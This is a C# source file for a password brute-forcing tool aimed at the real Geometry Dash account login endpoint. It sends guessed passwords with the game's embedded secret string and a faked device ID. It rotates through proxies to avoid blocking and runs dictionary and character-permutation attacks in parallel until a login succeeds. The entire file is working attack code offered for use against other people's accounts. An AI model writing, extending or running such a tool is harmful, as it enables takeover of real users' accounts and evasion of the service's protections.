using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace GDH.Special.Bruteforce
{
    public static class BruteforceGDH
    {
        private static Random random = new Random();

        private static string GenerateUDID() => "S" + new string(Enumerable.Repeat("1234567890", 37).Select(s => s[random.Next(s.Length)]).ToArray());

        public static bool Check(string username, string password)
        {
            while (true)
            {
                ProxyClient client = ProxyQueue.NextProxy();

                Console.WriteLine($"Checking {password} for {username} using {(client == null ? "no proxy" : $"proxy {client}")}.");
                using (var request = new HttpRequest())
                {
                    request.Proxy = client;
                    if (request.Proxy != null)
                        request.Proxy.ConnectTimeout = 6000;

                    try
                    {
                        string response = request.Post("http://www.boomlings.com/database/accounts/loginGJAccount.php", $"udid={GenerateUDID()}&userName={username}&password={password}&secret=Wmfv3899gc9", "application/x-www-form-urlencoded").ToString();
                        if (response.StartsWith("-"))
                            return false;
                        return true;
                    }
                    catch (Exception ex) { Console.WriteLine($"Failed with proxy {client} ({(int)request.Response.StatusCode}), retrying with another one..."); }
                }
            }
        }

        public static IEnumerable<string> Permutations(char[] chars, int length)
        {
            if (length <= 0) yield break;
            foreach (var a in chars)
            {
                yield return a.ToString();
                foreach (var b in Permutations(chars, length - 1)) yield return a + b;
            }
        }

        public static string DictionaryAttack(string username, IEnumerable<string> wordlist)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            ParallelOptions po = new ParallelOptions();
            po.CancellationToken = cts.Token;
            po.MaxDegreeOfParallelism = Environment.ProcessorCount;

            string password = string.Empty;

            try
            {
                Parallel.ForEach(wordlist, po, (word, loopState) =>
                {
                    if (Check(username, word))
                    {
                        password = word;
                        cts.Cancel();
                    }
                });
            }
            catch (OperationCanceledException) { Console.WriteLine($"Password is \"{password}\"!"); }

            return password;
        }

        public static string GeneratorAttack(string username, char[] chars, int lengthMin, int lengthMax) => DictionaryAttack(username, Permutations(chars, lengthMax).Where(item => item.Length >= lengthMin));
    }
}
